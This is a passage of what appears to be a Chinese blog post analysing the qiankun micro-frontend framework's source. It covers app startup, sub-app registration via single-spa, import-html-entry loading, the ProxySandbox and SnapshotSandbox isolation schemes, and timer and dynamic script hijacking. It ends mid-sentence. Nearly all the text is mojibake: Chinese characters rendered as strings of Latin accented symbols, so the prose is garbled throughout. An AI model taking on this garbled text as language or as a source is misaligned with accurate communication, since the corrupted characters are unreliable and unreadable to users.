å‡½æ•°å¼€å§‹è§£æï¼ˆè§ä¸‹å›¾ï¼‰ï¼š æˆ‘ä»¬å¯¹ start å‡½æ•°è¿›è¡Œé€è¡Œè§£æï¼š ç¬¬ 196 è¡Œï¼šè®¾ç½® window çš„ __POWERED_BY_QIANKUN__ å±æ€§ä¸º trueï¼Œåœ¨å­åº”ç”¨ä¸­ä½¿ç”¨ window.__POWERED_BY_QIANKUN__ å€¼åˆ¤æ–­æ˜¯å¦è¿è¡Œåœ¨ä¸»åº”ç”¨å®¹å™¨ä¸­ã€‚ ç¬¬ 198~199 è¡Œï¼šè®¾ç½®é…ç½®å‚æ•°ï¼ˆæœ‰é»˜è®¤å€¼ï¼‰ï¼Œå°†é…ç½®å‚æ•°å­˜å‚¨åœ¨ importLoaderConfiguration å¯¹è±¡ä¸­ï¼› ç¬¬ 201~203 è¡Œï¼šæ£€æŸ¥ prefetch å±æ€§ï¼Œå¦‚æœéœ€è¦é¢„åŠ è½½ï¼Œåˆ™æ·»åŠ å…¨å±€äº‹ä»¶ single-spa:first-mount ç›‘å¬ï¼Œåœ¨ç¬¬ä¸€ä¸ªå­åº”ç”¨æŒ‚è½½åé¢„åŠ è½½å…¶ä»–å­åº”ç”¨èµ„æºï¼Œä¼˜åŒ–åç»­å…¶ä»–å­åº”ç”¨çš„åŠ è½½é€Ÿåº¦ã€‚ ç¬¬ 205 è¡Œï¼šæ ¹æ® singularMode å‚æ•°è®¾ç½®æ˜¯å¦ä¸ºå•å®ä¾‹æ¨¡å¼ã€‚ ç¬¬ 209~217 è¡Œï¼šæ ¹æ® jsSandbox å‚æ•°è®¾ç½®æ˜¯å¦å¯ç”¨æ²™ç®±è¿è¡Œç¯å¢ƒï¼Œæ—§ç‰ˆæœ¬éœ€è¦å…³é—­è¯¥é€‰é¡¹ä»¥å…¼å®¹ IEã€‚ï¼ˆæ–°ç‰ˆæœ¬åœ¨å•å®ä¾‹æ¨¡å¼ä¸‹é»˜è®¤æ”¯æŒ IEï¼Œå¤šå®ä¾‹æ¨¡å¼ä¾ç„¶ä¸æ”¯æŒ IEï¼‰ã€‚ ç¬¬ 222 è¡Œï¼šè°ƒç”¨äº† single-spa çš„ startSingleSpa æ–¹æ³•å¯åŠ¨åº”ç”¨ï¼Œè¿™ä¸ªåœ¨ single-spa ç¯‡æˆ‘ä»¬ä¼šå•ç‹¬å‰–æï¼Œè¿™é‡Œå¯ä»¥ç®€å•ç†è§£ä¸ºå¯åŠ¨ä¸»åº”ç”¨ã€‚ ä»ä¸Šé¢å¯ä»¥çœ‹å‡ºï¼Œstart å‡½æ•°è´Ÿè´£åˆå§‹åŒ–ä¸€äº›å…¨å±€è®¾ç½®ï¼Œç„¶åå¯åŠ¨åº”ç”¨ã€‚è¿™äº›åˆå§‹åŒ–çš„é…ç½®å‚æ•°æœ‰ä¸€éƒ¨åˆ†å°†åœ¨ registerMicroApps æ³¨å†Œå­åº”ç”¨çš„å›è°ƒå‡½æ•°ä¸­ä½¿ç”¨ï¼Œæˆ‘ä»¬ç»§ç»­å¾€ä¸‹çœ‹ã€‚ æ³¨å†Œå­åº”ç”¨ - registerMicroApps(apps, lifeCycles?)registerMicroApps` å‡½æ•°çš„ä½œç”¨æ˜¯æ³¨å†Œå­åº”ç”¨ï¼Œå¹¶ä¸”åœ¨å­åº”ç”¨æ¿€æ´»æ—¶ï¼Œåˆ›å»ºè¿è¡Œæ²™ç®±ï¼Œåœ¨ä¸åŒé˜¶æ®µè°ƒç”¨ä¸åŒçš„ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°ã€‚ï¼ˆè§ä¸‹å›¾ï¼‰ ä»ä¸Šé¢å¯ä»¥çœ‹å‡ºï¼Œåœ¨ ç¬¬ 70~71 è¡Œ å¤„ registerMicroApps å‡½æ•°åšäº†ä¸ªå¤„ç†ï¼Œé˜²æ­¢é‡å¤æ³¨å†Œç›¸åŒçš„å­åº”ç”¨ã€‚ åœ¨ ç¬¬ 74 è¡Œ è°ƒç”¨äº† single-spa çš„ registerApplication æ–¹æ³•æ³¨å†Œäº†å­åº”ç”¨ã€‚ æˆ‘ä»¬ç›´æ¥æ¥çœ‹ registerApplication æ–¹æ³•ï¼ŒregisterApplication æ–¹æ³•æ˜¯ single-spa ä¸­æ³¨å†Œå­åº”ç”¨çš„æ ¸å¿ƒå‡½æ•°ã€‚è¯¥å‡½æ•°æœ‰å››ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯ nameï¼ˆå­åº”ç”¨çš„åç§°ï¼‰ å›è°ƒå‡½æ•°ï¼ˆactiveRule æ¿€æ´»æ—¶è°ƒç”¨ï¼‰ activeRuleï¼ˆå­åº”ç”¨çš„æ¿€æ´»è§„åˆ™ï¼‰ propsï¼ˆä¸»åº”ç”¨éœ€è¦ä¼ é€’ç»™å­åº”ç”¨çš„æ•°æ®ï¼‰ è¿™äº›å‚æ•°éƒ½æ˜¯ç”± single-spa ç›´æ¥å®ç°ï¼Œè¿™é‡Œå¯ä»¥å…ˆç®€å•ç†è§£ä¸ºæ³¨å†Œå­åº”ç”¨ï¼ˆè¿™ä¸ªæˆ‘ä»¬ä¼šåœ¨ single-spa ç¯‡å±•å¼€è¯´ï¼‰ã€‚åœ¨ç¬¦åˆ activeRule æ¿€æ´»è§„åˆ™æ—¶å°†ä¼šæ¿€æ´»å­åº”ç”¨ï¼Œæ‰§è¡Œå›è°ƒå‡½æ•°ï¼Œè¿”å›ä¸€äº›ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°ï¼ˆè§ä¸‹å›¾ï¼‰ã€‚ æ³¨æ„ï¼Œè¿™äº›ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°å±äº single-spaï¼Œç”± single-spa å†³å®šåœ¨ä½•æ—¶è°ƒç”¨ï¼Œè¿™é‡Œæˆ‘ä»¬ä»å‡½æ•°åæ¥ç®€å•ç†è§£ã€‚ï¼ˆbootstrap - åˆå§‹åŒ–å­åº”ç”¨ï¼Œmount - æŒ‚è½½å­åº”ç”¨ï¼Œunmount - å¸è½½å­åº”ç”¨ï¼‰ å¦‚æœä½ è¿˜æ˜¯è§‰å¾—æœ‰ç‚¹æ‡µï¼Œæ²¡å…³ç³»ï¼Œæˆ‘ä»¬é€šè¿‡ä¸€å¼ å›¾æ¥å¸®åŠ©ç†è§£ã€‚ï¼ˆè§ä¸‹å›¾ï¼‰ è·å–å­åº”ç”¨èµ„æº - import-html-entryæˆ‘ä»¬ä»ä¸Šé¢åˆ†æå¯ä»¥çœ‹å‡ºï¼Œqiankun çš„ registerMicroApps æ–¹æ³•ä¸­ç¬¬ä¸€ä¸ªå…¥å‚ apps - Array&gt; æœ‰ä¸‰ä¸ªå‚æ•° nameã€activeRuleã€props éƒ½æ˜¯äº¤ç»™ single-spa ä½¿ç”¨ï¼Œè¿˜æœ‰ entry å’Œ render å‚æ•°è¿˜æ²¡æœ‰ç”¨åˆ°ã€‚ æˆ‘ä»¬è¿™é‡Œéœ€è¦å…³æ³¨ entryï¼ˆå­åº”ç”¨çš„ entry åœ°å€ï¼‰ å’Œ renderï¼ˆå­åº”ç”¨è¢«æ¿€æ´»æ—¶è§¦å‘çš„æ¸²æŸ“è§„åˆ™ï¼‰ è¿™ä¸¤ä¸ªè¿˜æ²¡æœ‰ç”¨åˆ°çš„å‚æ•°ï¼Œè¿™ä¸¤ä¸ªå‚æ•°å»¶è¿Ÿåˆ° single-spa å­åº”ç”¨æ¿€æ´»åçš„å›è°ƒå‡½æ•°ä¸­æ‰§è¡Œã€‚ é‚£æˆ‘ä»¬å‡è®¾æ­¤æ—¶æˆ‘ä»¬çš„å­åº”ç”¨å·²æ¿€æ´»ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹è¿™é‡Œåšäº†ä»€ä¹ˆã€‚ï¼ˆè§ä¸‹å›¾ï¼‰ ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼Œåœ¨å­åº”ç”¨æ¿€æ´»åï¼Œé¦–å…ˆåœ¨ ç¬¬ 81~84 è¡Œ å¤„ä½¿ç”¨äº† import-html-entry åº“ä» entry è¿›å…¥åŠ è½½å­åº”ç”¨ï¼ŒåŠ è½½å®Œæˆåå°†è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼ˆè§ä¸‹å›¾ï¼‰ æˆ‘ä»¬æ¥è§£é‡Šä¸€ä¸‹è¿™å‡ ä¸ªå­—æ®µ å­—æ®µ è§£é‡Š template å°†è„šæœ¬æ–‡ä»¶å†…å®¹æ³¨é‡Šåçš„ html æ¨¡æ¿æ–‡ä»¶ assetPublicPath èµ„æºåœ°å€æ ¹è·¯å¾„ï¼Œå¯ç”¨äºåŠ è½½å­åº”ç”¨èµ„æº getExternalScripts æ–¹æ³•ï¼šè·å–å¤–éƒ¨å¼•å…¥çš„è„šæœ¬æ–‡ä»¶ getExternalStyleSheets æ–¹æ³•ï¼šè·å–å¤–éƒ¨å¼•å…¥çš„æ ·å¼è¡¨æ–‡ä»¶ execScripts æ–¹æ³•ï¼šæ‰§è¡Œè¯¥æ¨¡æ¿æ–‡ä»¶ä¸­æ‰€æœ‰çš„ JS è„šæœ¬æ–‡ä»¶ï¼Œå¹¶ä¸”å¯ä»¥æŒ‡å®šè„šæœ¬çš„ä½œç”¨åŸŸ - proxy å¯¹è±¡ æˆ‘ä»¬å…ˆå°† template æ¨¡æ¿ã€getExternalScripts å’Œ getExternalStyleSheets å‡½æ•°çš„æ‰§è¡Œç»“æœæ‰“å°å‡ºæ¥ï¼Œæ•ˆæœå¦‚ä¸‹ï¼ˆè§ä¸‹å›¾ï¼‰ï¼š ä»ä¸Šå›¾æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å¤–éƒ¨å¼•å…¥çš„ä¸‰ä¸ª js è„šæœ¬æ–‡ä»¶ï¼Œè¿™ä¸ªæ¨¡æ¿æ–‡ä»¶æ²¡æœ‰å¤–éƒ¨ css æ ·å¼è¡¨ï¼Œå¯¹åº”çš„æ ·å¼è¡¨æ•°ç»„ä¹Ÿä¸ºç©ºã€‚ ç„¶åæˆ‘ä»¬å†æ¥åˆ†æ execScripts æ–¹æ³•ï¼Œè¯¥æ–¹æ³•çš„ä½œç”¨å°±æ˜¯æŒ‡å®šä¸€ä¸ª proxyï¼ˆé»˜è®¤æ˜¯ windowï¼‰å¯¹è±¡ï¼Œç„¶åæ‰§è¡Œè¯¥æ¨¡æ¿æ–‡ä»¶ä¸­æ‰€æœ‰çš„ JSï¼Œå¹¶è¿”å› JS æ‰§è¡Œå proxy å¯¹è±¡çš„æœ€åä¸€ä¸ªå±æ€§ï¼ˆè§ä¸‹å›¾ 1ï¼‰ã€‚åœ¨å¾®å‰ç«¯æ¶æ„ä¸­ï¼Œè¿™ä¸ªå¯¹è±¡ä¸€èˆ¬ä¼šåŒ…å«ä¸€äº›å­åº”ç”¨çš„ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°ï¼ˆè§ä¸‹å›¾ 2ï¼‰ï¼Œä¸»åº”ç”¨å¯ä»¥é€šè¿‡åœ¨ç‰¹å®šé˜¶æ®µè°ƒç”¨è¿™äº›ç”Ÿå‘½å‘¨æœŸé’©å­å‡½æ•°ï¼Œè¿›è¡ŒæŒ‚è½½å’Œé”€æ¯å­åº”ç”¨çš„æ“ä½œã€‚ åœ¨ qiankun çš„ importEntry å‡½æ•°ä¸­è¿˜ä¼ å…¥äº†é…ç½®é¡¹ getTemplateï¼Œè¿™ä¸ªå…¶å®æ˜¯å¯¹ html ç›®æ ‡æ–‡ä»¶çš„äºŒæ¬¡å¤„ç†ï¼Œè¿™é‡Œå°±ä¸ä½œå±•å¼€äº†ï¼Œæœ‰å…´è¶£çš„å¯ä»¥è‡ªè¡Œå»äº†è§£ä¸€ä¸‹ã€‚ ä¸»åº”ç”¨æŒ‚è½½å­åº”ç”¨ HTML æ¨¡æ¿æˆ‘ä»¬å›åˆ° qiankun æºç éƒ¨åˆ†ç»§ç»­çœ‹ï¼ˆè§ä¸‹å›¾ï¼‰ ä»ä¸Šå›¾çœ‹å‡ºï¼Œåœ¨ ç¬¬ 85~87 è¡Œ å¤„ï¼Œå…ˆå¯¹å•å®ä¾‹è¿›è¡Œæ£€æµ‹ã€‚åœ¨å•å®ä¾‹æ¨¡å¼ä¸‹ï¼Œæ–°çš„å­åº”ç”¨æŒ‚è½½è¡Œä¸ºä¼šåœ¨æ—§çš„å­åº”ç”¨å¸è½½ä¹‹åæ‰å¼€å§‹ã€‚ åœ¨ ç¬¬ 88 è¡Œ ä¸­ï¼Œæ‰§è¡Œæ³¨å†Œå­åº”ç”¨æ—¶ä¼ å…¥çš„ render å‡½æ•°ï¼Œå°† HTML Template å’Œ loading ä½œä¸ºå…¥å‚ï¼Œrender å‡½æ•°çš„å†…å®¹ä¸€èˆ¬æ˜¯å°† HTML æŒ‚è½½åœ¨æŒ‡å®šå®¹å™¨ä¸­ï¼ˆè§ä¸‹å›¾ï¼‰ã€‚ åœ¨è¿™ä¸ªé˜¶æ®µï¼Œä¸»åº”ç”¨å·²ç»å°†å­åº”ç”¨åŸºç¡€çš„ HTML ç»“æ„æŒ‚è½½åœ¨äº†ä¸»åº”ç”¨çš„æŸä¸ªå®¹å™¨å†…ï¼Œæ¥ä¸‹æ¥è¿˜éœ€è¦æ‰§è¡Œå­åº”ç”¨å¯¹åº”çš„ mount æ–¹æ³•ï¼ˆå¦‚ Vue.$mountï¼‰å¯¹å­åº”ç”¨çŠ¶æ€è¿›è¡ŒæŒ‚è½½ã€‚ æ­¤æ—¶é¡µé¢è¿˜å¯ä»¥æ ¹æ® loading å‚æ•°å¼€å¯ä¸€ä¸ªç±»ä¼¼åŠ è½½çš„æ•ˆæœï¼Œç›´è‡³å­åº”ç”¨å…¨éƒ¨å†…å®¹åŠ è½½å®Œæˆã€‚ æ²™ç®±è¿è¡Œç¯å¢ƒ - genSandboxæˆ‘ä»¬å›åˆ° qiankun æºç éƒ¨åˆ†ç»§ç»­çœ‹ï¼Œæ­¤æ—¶è¿˜æ˜¯å­åº”ç”¨æ¿€æ´»æ—¶çš„å›è°ƒå‡½æ•°éƒ¨åˆ†ï¼ˆè§ä¸‹å›¾ï¼‰ åœ¨ ç¬¬ 90~98 è¡Œ æ˜¯ qiankun æ¯”è¾ƒæ ¸å¿ƒçš„éƒ¨åˆ†ï¼Œä¹Ÿæ˜¯å‡ ä¸ªå­åº”ç”¨ä¹‹é—´çŠ¶æ€ç‹¬ç«‹çš„å…³é”®ï¼Œé‚£å°±æ˜¯ js çš„æ²™ç®±è¿è¡Œç¯å¢ƒã€‚å¦‚æœå…³é—­äº† useJsSandbox é€‰é¡¹ï¼Œé‚£ä¹ˆæ‰€æœ‰å­åº”ç”¨çš„æ²™ç®±ç¯å¢ƒéƒ½æ˜¯ windowï¼Œå°±å¾ˆå®¹æ˜“å¯¹å…¨å±€çŠ¶æ€äº§ç”Ÿæ±¡æŸ“ã€‚ æˆ‘ä»¬è¿›å…¥åˆ° genSandbox å†…éƒ¨ï¼Œçœ‹çœ‹ qiankun æ˜¯å¦‚ä½•åˆ›å»ºçš„ ï¼ˆJSï¼‰æ²™ç®±è¿è¡Œç¯å¢ƒã€‚ï¼ˆè§ä¸‹å›¾ï¼‰ ä»ä¸Šå›¾å¯ä»¥çœ‹å‡º genSandbox å†…éƒ¨çš„æ²™ç®±ä¸»è¦æ˜¯é€šè¿‡æ˜¯å¦æ”¯æŒ window.Proxy åˆ†ä¸º ProxySandbox å’Œ SnapshotSandbox ä¸¤ç§ï¼ˆå¤šå®ä¾‹è¿˜æœ‰ä¸€ç§ LegacySandbox æ²™ç®±ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸ä½œè®²è§£ï¼‰ã€‚ ProxySandboxæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ ProxySandbox æ²™ç®±æ˜¯æ€ä¹ˆè¿›è¡ŒçŠ¶æ€éš”ç¦»çš„ï¼ˆè§ä¸‹å›¾ï¼‰ æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ ProxySandbox ç±»çš„å‡ ä¸ªå±æ€§ï¼š å­—æ®µ è§£é‡Š updateValueMap è®°å½•æ²™ç®±ä¸­æ›´æ–°çš„å€¼ï¼Œä¹Ÿå°±æ˜¯æ¯ä¸ªå­åº”ç”¨ä¸­ç‹¬ç«‹çš„çŠ¶æ€æ±  name æ²™ç®±åç§° proxy ä»£ç†å¯¹è±¡ï¼Œå¯ä»¥ç†è§£ä¸ºå­åº”ç”¨çš„ global/window å¯¹è±¡ sandboxRunning å½“å‰æ²™ç®±æ˜¯å¦åœ¨è¿è¡Œä¸­ active æ¿€æ´»æ²™ç®±ï¼Œåœ¨å­åº”ç”¨æŒ‚è½½æ—¶å¯åŠ¨ inactive å…³é—­æ²™ç®±ï¼Œåœ¨å­åº”ç”¨å¸è½½æ—¶å¯åŠ¨ constructor æ„é€ å‡½æ•°ï¼Œåˆ›å»ºæ²™ç®±ç¯å¢ƒ æˆ‘ä»¬ç°åœ¨ä» window.Proxy çš„ set å’Œ get å±æ€§æ¥è¯¦ç»†è®²è§£ ProxySandbox æ˜¯å¦‚ä½•å®ç°æ²™ç®±è¿è¡Œç¯å¢ƒçš„ã€‚ï¼ˆè§ä¸‹å›¾ï¼‰ æ³¨æ„ï¼šå­åº”ç”¨æ²™ç®±ä¸­çš„ proxy å¯¹è±¡å¯ä»¥ç®€å•ç†è§£ä¸ºå­åº”ç”¨çš„ window å…¨å±€å¯¹è±¡ï¼ˆä»£ç å¦‚ä¸‹ï¼‰ï¼Œå­åº”ç”¨å¯¹å…¨å±€å±æ€§çš„æ“ä½œå°±æ˜¯å¯¹è¯¥ proxy å¯¹è±¡å±æ€§çš„æ“ä½œï¼Œå¸¦ç€è¿™ä»½ç†è§£ç»§ç»­å¾€ä¸‹çœ‹å§ã€‚ 12345678// å­åº”ç”¨è„šæœ¬æ–‡ä»¶çš„æ‰§è¡Œè¿‡ç¨‹ï¼ševal( // è¿™é‡Œå°† proxy ä½œä¸º window å‚æ•°ä¼ å…¥ // å­åº”ç”¨çš„å…¨å±€å¯¹è±¡å°±æ˜¯è¯¥å­åº”ç”¨æ²™ç®±çš„ proxy å¯¹è±¡ (function(window) &#123; /* å­åº”ç”¨è„šæœ¬æ–‡ä»¶å†…å®¹ */ &#125;)(proxy)); å½“è°ƒç”¨ set å‘å­åº”ç”¨ proxy/window å¯¹è±¡è®¾ç½®å±æ€§æ—¶ï¼Œæ‰€æœ‰çš„å±æ€§è®¾ç½®å’Œæ›´æ–°éƒ½ä¼šå‘½ä¸­ updateValueMapï¼Œå­˜å‚¨åœ¨ updateValueMap é›†åˆä¸­ï¼ˆç¬¬ 38 è¡Œï¼‰ï¼Œä»è€Œé¿å…å¯¹ window å¯¹è±¡äº§ç”Ÿå½±å“ï¼ˆæ—§ç‰ˆæœ¬åˆ™æ˜¯é€šè¿‡ diff ç®—æ³•è¿˜åŸ window å¯¹è±¡çŠ¶æ€å¿«ç…§ï¼Œå­åº”ç”¨ä¹‹é—´çš„çŠ¶æ€æ˜¯éš”ç¦»çš„ï¼Œè€Œçˆ¶å­åº”ç”¨ä¹‹é—´ window å¯¹è±¡ä¼šæœ‰æ±¡æŸ“ï¼‰ã€‚ å½“è°ƒç”¨ get ä»å­åº”ç”¨ proxy/window å¯¹è±¡å–å€¼æ—¶ï¼Œä¼šä¼˜å…ˆä»å­åº”ç”¨çš„æ²™ç®±çŠ¶æ€æ±  updateValueMap ä¸­å–å€¼ï¼Œå¦‚æœæ²¡æœ‰å‘½ä¸­æ‰ä»ä¸»åº”ç”¨çš„ window å¯¹è±¡ä¸­å–å€¼ï¼ˆç¬¬ 49 è¡Œï¼‰ã€‚å¯¹äºéæ„é€ å‡½æ•°çš„å–å€¼å°†ä¼šå¯¹ this æŒ‡é’ˆç»‘å®šåˆ° window å¯¹è±¡åï¼Œå†è¿”å›å‡½æ•°ã€‚ å¦‚æ­¤ä¸€æ¥ï¼ŒProxySandbox æ²™ç®±åº”ç”¨ä¹‹é—´çš„éš”ç¦»å°±å®Œæˆäº†ï¼Œæ‰€æœ‰å­åº”ç”¨å¯¹ proxy/window å¯¹è±¡å€¼çš„å­˜å–éƒ½å—åˆ°äº†æ§åˆ¶ã€‚è®¾ç½®å€¼åªä¼šä½œç”¨åœ¨æ²™ç®±å†…éƒ¨çš„ updateValueMap é›†åˆä¸Šï¼Œå–å€¼ä¹Ÿæ˜¯ä¼˜å…ˆå–å­åº”ç”¨ç‹¬ç«‹çŠ¶æ€æ± ï¼ˆupdateValueMapï¼‰ä¸­çš„å€¼ï¼Œæ²¡æœ‰æ‰¾åˆ°çš„è¯ï¼Œå†ä» proxy/window å¯¹è±¡ä¸­å–å€¼ã€‚ æˆ‘ä»¬å¯¹ ProxySandbox æ²™ç®±ç”»ä¸€å¼ å›¾æ¥åŠ æ·±ç†è§£ï¼ˆè§ä¸‹å›¾ï¼‰ SnapshotSandboxåœ¨ä¸æ”¯æŒ window.Proxy å±æ€§æ—¶ï¼Œå°†ä¼šä½¿ç”¨ SnapshotSandbox æ²™ç®±ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹å…¶å†…éƒ¨å®ç°ï¼ˆè§ä¸‹å›¾ï¼‰ æˆ‘ä»¬æ¥åˆ†æä¸€ä¸‹ SnapshotSandbox ç±»çš„å‡ ä¸ªå±æ€§ï¼š å­—æ®µ è§£é‡Š name æ²™ç®±åç§° proxy ä»£ç†å¯¹è±¡ï¼Œæ­¤å¤„ä¸º window å¯¹è±¡ sandboxRunning å½“å‰æ²™ç®±æ˜¯å¦æ¿€æ´» windowSnapshot window çŠ¶æ€å¿«ç…§ modifyPropsMap æ²™ç®±è¿è¡ŒæœŸé—´è¢«ä¿®æ”¹è¿‡çš„ window å±æ€§ constructor æ„é€ å‡½æ•°ï¼Œæ¿€æ´»æ²™ç®± active æ¿€æ´»æ²™ç®±ï¼Œåœ¨å­åº”ç”¨æŒ‚è½½æ—¶å¯åŠ¨ inactive å…³é—­æ²™ç®±ï¼Œåœ¨å­åº”ç”¨å¸è½½æ—¶å¯åŠ¨ SnapshotSandbox çš„æ²™ç®±ç¯å¢ƒä¸»è¦æ˜¯é€šè¿‡æ¿€æ´»æ—¶è®°å½• window çŠ¶æ€å¿«ç…§ï¼Œåœ¨å…³é—­æ—¶é€šè¿‡å¿«ç…§è¿˜åŸ window å¯¹è±¡æ¥å®ç°çš„ã€‚ï¼ˆè§ä¸‹å›¾ï¼‰ æˆ‘ä»¬å…ˆçœ‹ active å‡½æ•°ï¼Œåœ¨æ²™ç®±æ¿€æ´»æ—¶ï¼Œä¼šå…ˆç»™å½“å‰ window å¯¹è±¡æ‰“ä¸€ä¸ªå¿«ç…§ï¼Œè®°å½•æ²™ç®±æ¿€æ´»å‰çš„çŠ¶æ€ï¼ˆç¬¬ 38~40 è¡Œï¼‰ã€‚æ‰“å®Œå¿«ç…§åï¼Œå‡½æ•°å†…éƒ¨å°† window çŠ¶æ€é€šè¿‡ modifyPropsMap è®°å½•è¿˜åŸåˆ°ä¸Šæ¬¡çš„æ²™ç®±è¿è¡Œç¯å¢ƒï¼Œä¹Ÿå°±æ˜¯è¿˜åŸæ²™ç®±æ¿€æ´»æœŸé—´ï¼ˆå†å²è®°å½•ï¼‰ä¿®æ”¹è¿‡çš„ window å±æ€§ã€‚ åœ¨æ²™ç®±å…³é—­æ—¶ï¼Œè°ƒç”¨ inactive å‡½æ•°ï¼Œåœ¨æ²™ç®±å…³é—­å‰é€šè¿‡éå†æ¯”è¾ƒæ¯ä¸€ä¸ªå±æ€§ï¼Œå°†è¢«æ”¹å˜çš„ window å¯¹è±¡å±æ€§å€¼ï¼ˆç¬¬ 54 è¡Œï¼‰è®°å½•åœ¨ modifyPropsMap é›†åˆä¸­ã€‚åœ¨è®°å½•äº† modifyPropsMap åï¼Œå°† window å¯¹è±¡é€šè¿‡å¿«ç…§ windowSnapshot è¿˜åŸåˆ°è¢«æ²™ç®±æ¿€æ´»å‰çš„çŠ¶æ€ï¼ˆç¬¬ 55 è¡Œï¼‰ï¼Œç›¸å½“äºæ˜¯å°†å­åº”ç”¨è¿è¡ŒæœŸé—´å¯¹ window é€ æˆçš„æ±¡æŸ“å…¨éƒ¨æ¸…é™¤ã€‚ SnapshotSandbox æ²™ç®±å°±æ˜¯åˆ©ç”¨å¿«ç…§å®ç°äº†å¯¹ window å¯¹è±¡çŠ¶æ€éš”ç¦»çš„ç®¡ç†ã€‚ç›¸æ¯”è¾ƒ ProxySandbox è€Œè¨€ï¼Œåœ¨å­åº”ç”¨æ¿€æ´»æœŸé—´ï¼ŒSnapshotSandbox å°†ä¼šå¯¹ window å¯¹è±¡é€ æˆæ±¡æŸ“ï¼Œå±äºä¸€ä¸ªå¯¹ä¸æ”¯æŒ Proxy å±æ€§çš„æµè§ˆå™¨çš„å‘ä¸‹å…¼å®¹æ–¹æ¡ˆã€‚ æˆ‘ä»¬å¯¹ SnapshotSandbox æ²™ç®±ç”»ä¸€å¼ å›¾æ¥åŠ æ·±ç†è§£ï¼ˆè§ä¸‹å›¾ï¼‰ æŒ‚è½½æ²™ç®± - mountSandbox æˆ‘ä»¬ç»§ç»­å›åˆ°è¿™å¼ å›¾ï¼ŒgenSandbox å‡½æ•°ä¸ä»…è¿”å›äº†ä¸€ä¸ª sandbox æ²™ç®±ï¼Œè¿˜è¿”å›äº†ä¸€ä¸ª mount å’Œ unmount æ–¹æ³•ï¼Œåˆ†åˆ«åœ¨å­åº”ç”¨æŒ‚è½½æ—¶å’Œå¸è½½æ—¶çš„æ—¶å€™è°ƒç”¨ã€‚ æˆ‘ä»¬å…ˆçœ‹çœ‹ mount å‡½æ•°å†…éƒ¨ï¼ˆè§ä¸‹å›¾ï¼‰ é¦–å…ˆï¼Œåœ¨ mount å†…éƒ¨å…ˆæ¿€æ´»äº†å­åº”ç”¨æ²™ç®±ï¼ˆç¬¬ 26 è¡Œï¼‰ï¼Œåœ¨æ²™ç®±å¯åŠ¨åå¼€å§‹åŠ«æŒå„ç±»å…¨å±€ç›‘å¬ï¼ˆç¬¬ 27 è¡Œï¼‰ï¼Œæˆ‘ä»¬è¿™é‡Œé‡ç‚¹çœ‹çœ‹ patchAtMounting å†…éƒ¨æ˜¯æ€ä¹ˆå®ç°çš„ã€‚ï¼ˆè§ä¸‹å›¾ï¼‰ patchAtMounting å†…éƒ¨è°ƒç”¨äº†ä¸‹é¢å››ä¸ªå‡½æ•°ï¼š patchTimerï¼ˆè®¡æ—¶å™¨åŠ«æŒï¼‰ patchWindowListenerï¼ˆwindow äº‹ä»¶ç›‘å¬åŠ«æŒï¼‰ patchHistoryListenerï¼ˆwindow.history äº‹ä»¶ç›‘å¬åŠ«æŒï¼‰ patchDynamicAppendï¼ˆåŠ¨æ€æ·»åŠ  Head å…ƒç´ äº‹ä»¶åŠ«æŒï¼‰ ä¸Šé¢å››ä¸ªå‡½æ•°å®ç°äº†å¯¹ window æŒ‡å®šå¯¹è±¡çš„ç»Ÿä¸€åŠ«æŒï¼Œæˆ‘ä»¬å¯ä»¥æŒ‘ä¸€äº›è§£æçœ‹çœ‹å…¶å†…éƒ¨å®ç°ã€‚ è®¡æ—¶å™¨åŠ«æŒ - patchTimeræˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ patchTimer å¯¹è®¡æ—¶å™¨çš„åŠ«æŒï¼ˆè§ä¸‹å›¾ï¼‰ ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼ŒpatchTimer å†…éƒ¨å°† setInterval è¿›è¡Œé‡è½½ï¼Œå°†æ¯ä¸ªå¯ç”¨çš„å®šæ—¶å™¨çš„ intervalId éƒ½æ”¶é›†èµ·æ¥ï¼ˆç¬¬ 23~24 è¡Œï¼‰ï¼Œä»¥ä¾¿åœ¨å­åº”ç”¨å¸è½½æ—¶è°ƒç”¨ free å‡½æ•°å°†è®¡æ—¶å™¨å…¨éƒ¨æ¸…é™¤ï¼ˆè§ä¸‹å›¾ï¼‰ã€‚ æˆ‘ä»¬æ¥çœ‹çœ‹åœ¨å­åº”ç”¨åŠ è½½æ—¶çš„ setInterval å‡½æ•°éªŒè¯å³å¯ï¼ˆè§ä¸‹å›¾ï¼‰ ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼Œåœ¨è¿›å…¥å­åº”ç”¨æ—¶ï¼ŒsetInterval å·²ç»è¢«æ›¿æ¢æˆäº†åŠ«æŒåçš„å‡½æ•°ï¼Œé˜²æ­¢å…¨å±€è®¡æ—¶å™¨æ³„éœ²æ±¡æŸ“ã€‚ åŠ¨æ€æ·»åŠ æ ·å¼è¡¨å’Œè„šæœ¬æ–‡ä»¶åŠ«æŒ - patchDynamicAppendpatchWindowListener å’Œ patchHistoryListener çš„å®ç°éƒ½ä¸ patchTimer å®ç°ç±»ä¼¼ï¼Œè¿™é‡Œå°±ä¸ä½œå¤è¿°äº†ã€‚ æˆ‘ä»¬éœ€è¦é‡ç‚¹å¯¹ patchDynamicAppend å‡½æ•°è¿›è¡Œè§£æï¼Œè¿™ä¸ªå‡½æ•°çš„ä½œç”¨æ˜¯åŠ«æŒå¯¹ head å…ƒç´ çš„æ“ä½œï¼ˆè§ä¸‹å›¾ï¼‰ ä»ä¸Šå›¾å¯ä»¥çœ‹å‡ºï¼ŒpatchDynamicAppend ä¸»è¦æ˜¯å¯¹åŠ¨æ€æ·»åŠ çš„ style æ ·å¼è¡¨å’Œ script æ ‡ç­¾åšäº†å¤„ç†ã€‚ æˆ‘ä»¬å…ˆçœ‹çœ‹å¯¹ style æ 